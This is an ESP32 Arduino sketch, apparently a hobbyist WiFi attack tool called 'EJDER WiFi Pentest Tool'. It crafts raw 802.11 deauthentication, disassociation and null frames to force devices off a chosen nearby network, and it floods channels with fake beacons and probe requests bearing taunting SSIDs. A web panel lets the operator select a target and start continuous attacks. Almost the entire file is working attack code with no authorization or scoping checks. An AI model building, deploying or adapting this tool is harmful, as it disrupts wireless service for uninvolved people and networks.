#include <WiFi.h>   //made by SirAtilotty
#include <WebServer.h>
#include "esp_wifi.h"
#include <vector>
#include <esp_random.h>

WebServer server(80);
bool deauthActive = false;
bool beaconFloodActive = false;
bool probeFloodActive = false;
bool deauthBurstActive = false;
int selectedNetwork = -1;
String selectedAttack = "";

struct NetworkInfo {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

std::vector<NetworkInfo> networks;

// Geliştirilmiş Deauthentication paket gönderici - çok daha agresif
void sendDeauth(uint8_t* bssid, int channel, uint8_t reason) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, reason, 0x00 
  };
  memcpy(packet + 10, bssid, 6);
  memcpy(packet + 16, bssid, 6);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Çok daha yoğun deauth paketi gönderimi - her kanalda 100 paket
  for (int i = 0; i < 100; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    delayMicroseconds(50); // Mikrosaniye seviyesinde gecikme - çok daha hızlı
  }
  
  // Disassociation paketleri de ekleyelim - daha etkili
  uint8_t disassocPacket[26] = {
    0xA0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, reason, 0x00 
  };
  memcpy(disassocPacket + 10, bssid, 6);
  memcpy(disassocPacket + 16, bssid, 6);
  
  for (int i = 0; i < 50; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, disassocPacket, sizeof(disassocPacket), false);
    delayMicroseconds(100);
  }
}

// Sürekli deauth burst modu - ağdan anında koparmak için
// Ejder V2.1 - Enhanced Lethal Burst Mode
void sendDeauthBurst(uint8_t* bssid, int channel) {
  // 1. Farklı Reason Code'lar ile Deauth (Ağdan Atma)
  // 1: Belirtilmemiş, 6: Kimlik doğrulanmamış, 7: İlişkilendirilmemiş
  uint8_t aggressiveReasons[] = {1, 6, 7, 4, 8};
  
  for (int i = 0; i < 5; i++) {
    sendDeauth(bssid, channel, aggressiveReasons[i]);
    delayMicroseconds(10); // Minimum gecikme, maksimum paket hızı
  }

  // 2. Null Frame Saldırısı (Cihazın uyku moduna geçmesini veya yanıt vermesini engeller)
  uint8_t nullPacket[24] = {
    0x48, 0x01, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Hedef: Herkes (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Kaynak (Aşağıda doldurulacak)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Aşağıda doldurulacak)
    0x00, 0x00
  };
  memcpy(nullPacket + 10, bssid, 6);
  memcpy(nullPacket + 16, bssid, 6);
  
  esp_wifi_80211_tx(WIFI_IF_AP, nullPacket, sizeof(nullPacket), false);

  // 3. Kanal Sabitleme ve Tekrar Gönderim
  // Bazı cihazlar kanal değiştirerek kaçmaya çalışır, bu yüzden kanal kontrolü kritik.
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Son bir darbe: Broadcast Disassociation
  // Bu, ağdaki tüm cihazların o AP ile olan bağını "geçersiz" kılar.
  sendDeauth(bssid, channel, 0x0001); 
}

// Geliştirilmiş Beacon Flood - daha çok sahte AP
void sendBeaconFlood() {
  // Daha kışkırtıcı SSID'ler
  String evilSSIDs[] = {
    "Hacked_By_EJDER", 
    "FREE_WIFI_HACKED", 
    "VIRUS_DETECTED",
    "YOUR_DATA_STOLEN",
    "EJDER_WAS_HERE",
    "UR HACKED LOL",
    "UR COOKED",
    "EJDER_HERE"
  };
  
  for (int i = 0; i < 30; i++) { // Daha fazla sahte AP
    uint8_t packet[128] = {
      0x80, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x04,
      0x00, 0x00, 
      0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
      0x03, 0x01, 0x06
    };
    
    // Rastgele MAC adresi
    for (int j = 0; j < 6; j++) { 
      packet[10 + j] = packet[16 + j] = esp_random() & 0xFF; 
    }
    
    // Rastgele SSID seç
    String targetSSID = evilSSIDs[i % 8];
    packet[37] = targetSSID.length();
    for (int j = 0; j < targetSSID.length(); j++) { 
      packet[38 + j] = targetSSID[j]; 
    }
    
    // Kanalları gez
    int chan = (i % 14) + 1; 
    packet[50] = chan;
    
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, 38 + targetSSID.length() + 12, false);
    delayMicroseconds(200); // Daha hızlı gönderim
  }
}

// Geliştirilmiş Probe Request Flood
void sendProbeFlood() {
  String probeSSIDs[] = {
    "PROBE_REQUEST_TEST", 
    "HACKED_BY_EJDER",
    "FREE_WIFI",
    "PASSWORD_STOLEN"
  };
  
  for (int i = 0; i < 20; i++) {
    uint8_t packet[64] = { 
      0x40, 0x00, 0x3A, 0x01, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
      0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
      0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
      0x00, 0x00, 0x00 
    };
    
    String ssid = probeSSIDs[i % 4];
    packet[24] = ssid.length();
    for (int j = 0; j < ssid.length(); j++) { 
      packet[25 + j] = ssid[j]; 
    }
    
    // Rastgele MAC adresi
    for (int j = 0; j < 6; j++) { 
      packet[10 + j] = packet[16 + j] = esp_random() & 0xFF; 
    }
    
    esp_wifi_80211_tx(WIFI_IF_AP, packet, 25 + ssid.length(), false);
    delayMicroseconds(100);
  }
}

void scanNetworks() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(100);
  int n = WiFi.scanNetworks();
  networks.clear();
  for (int i = 0; i < n && i < 30; i++) { // Daha fazla ağ tarama
    NetworkInfo net;
    net.ssid = WiFi.SSID(i);
    memcpy(net.bssid, WiFi.BSSID(i), 6);
    net.channel = WiFi.channel(i);
    net.rssi = WiFi.RSSI(i);
    networks.push_back(net);
  }
}

String getHTML() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'><style>";
  html += "body{font-family:sans-serif; background:#f4f4f4; padding:20px;} .btn{padding:12px;margin:5px; border:none; border-radius:5px; cursor:pointer; font-weight:bold;}";
  html += ".danger{background:#e74c3c; color:white;} .ok{background:#2ecc71; color:white;} .warning{background:#f39c12; color:white;}";
  html += ".net{background:white; padding:10px; margin:5px 0; border-left:5px solid #3498db; cursor:pointer;} .selected{background:#ffecec; border-left:5px solid #e74c3c;}";
  html += "#status{padding:15px; margin-bottom:15px; background:#fff; border-radius:5px; font-weight:bold; border:1px solid #ddd;}";
  html += ".attack-active{animation: pulse 1s infinite;} @keyframes pulse {0% {background-color: #e74c3c;} 50% {background-color: #c0392b;} 100% {background-color: #e74c3c;}}</style>";
  html += "<script>function selectNetwork(i){fetch('/select?index='+i).then(r=>r.text()).then(t=>document.getElementById('status').innerHTML=t);}";
  html += "function selectAttack(t){fetch('/selectAttack?type='+t).then(r=>r.text()).then(t=>document.getElementById('status').innerHTML=t);}";
  html += "function toggleAttack(){fetch('/startAttack').then(r=>r.text()).then(t=>document.getElementById('status').innerHTML=t);}";
  html += "function scan(){document.getElementById('status').innerHTML='Scanning...'; fetch('/scan').then(r=>r.text()).then(d=>{document.getElementById('networks').innerHTML=d; document.getElementById('status').innerHTML='Scan completed.';});}</script></head><body>";
  html += "<h1>EJDER WiFi Pentest Tool - ULTIMATE</h1><div id='status'>System Ready - Maximum Power Enabled</div>";
  html += "<button class='btn ok' onclick='scan()'>Scan Networks</button>";
  html += "<h3>Attack Type</h3>";
  html += "<button class='btn danger' onclick=\"selectAttack('deauth')\">Deauth Attack</button>";
  html += "<button class='btn danger' onclick=\"selectAttack('burst')\">Deauth BURST (INSTANT)</button>";
  html += "<button class='btn warning' onclick=\"selectAttack('beacon')\">Beacon Flood</button>";
  html += "<button class='btn warning' onclick=\"selectAttack('probe')\">Probe Flood</button>";
  html += "<br><button class='btn danger attack-active' style='width:100%; margin-top:20px;' onclick='toggleAttack()'>START / STOP ATTACK</button>";
  html += "<h3>Network List</h3><div id='networks'></div></body></html>";
  return html;
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("EJDER_ULTIMATE", "EJDERYA32");

  server.on("/", HTTP_GET, []() { server.send(200, "text/html", getHTML()); });
  
  server.on("/scan", HTTP_GET, []() {
    scanNetworks();
    String res = "";
    for (int i = 0; i < networks.size(); i++) {
      res += "<div class='net' onclick='selectNetwork(" + String(i) + ")'><strong>" + networks[i].ssid + "</strong><br>RSSI: " + String(networks[i].rssi) + "dBm | CH: " + String(networks[i].channel) + "</div>";
    }
    server.send(200, "text/html", res);
  });

  server.on("/select", HTTP_GET, []() {
    if (server.hasArg("index")) {
      selectedNetwork = server.arg("index").toInt();
      server.send(200, "text/plain", "Target: " + networks[selectedNetwork].ssid + " - READY FOR DESTRUCTION");
    }
  });

  server.on("/selectAttack", HTTP_GET, []() {
    if (server.hasArg("type")) {
      selectedAttack = server.arg("type");
      deauthActive = beaconFloodActive = probeFloodActive = deauthBurstActive = false;
      server.send(200, "text/plain", "Selected Attack: " + selectedAttack + " - ARMED");
    }
  });

  server.on("/startAttack", HTTP_GET, []() {
    if (deauthActive || beaconFloodActive || probeFloodActive || deauthBurstActive) {
      deauthActive = beaconFloodActive = probeFloodActive = deauthBurstActive = false;
      server.send(200, "text/plain", "Attack STOPPED.");
    } else {
      if (selectedAttack == "deauth" && selectedNetwork != -1) {
        deauthActive = true;
        server.send(200, "text/plain", "Deauth started on: " + networks[selectedNetwork].ssid + " - DEVICE WILL BE DISCONNECTED!");
      }
      else if (selectedAttack == "burst" && selectedNetwork != -1) {
        deauthBurstActive = true;
        server.send(200, "text/plain", "DEAUTH BURST ACTIVATED! " + networks[selectedNetwork].ssid + " WILL BE INSTANTLY DESTROYED!");
      }
      else if (selectedAttack == "beacon") {
        beaconFloodActive = true;
        server.send(200, "text/plain", "Beacon Flood STARTED! ALL CHANNELS COMPROMISED!");
      }
      else if (selectedAttack == "probe") {
        probeFloodActive = true;
        server.send(200, "text/plain", "Probe Flood STARTED! ALL DEVICES FLOODED!");
      } else {
        server.send(200, "text/plain", "Error: Select attack type & network first.");
      }
    }
  });

  server.begin();
  Serial.println("EJDER ULTIMATE WiFi Pentest Tool - Ready for Maximum Destruction");
}

void loop() {
  server.handleClient();
  
  if (deauthActive && selectedNetwork != -1) {
    sendDeauth(networks[selectedNetwork].bssid, networks[selectedNetwork].channel, 2);
    delayMicroseconds(500); // Daha sık deauth paketleri
  }
  
  if (deauthBurstActive && selectedNetwork != -1) {
    sendDeauthBurst(networks[selectedNetwork].bssid, networks[selectedNetwork].channel);
    delayMicroseconds(200); // Sürekli burst modu - cihaz anında düşer
  }
  
  if (beaconFloodActive) { 
    sendBeaconFlood(); 
    delayMicroseconds(300); // Daha yoğun beacon flood
  }
  
  if (probeFloodActive) { 
    sendProbeFlood(); 
    delayMicroseconds(250); // Daha yoğun probe flood
  }
  
  delay(1);
}
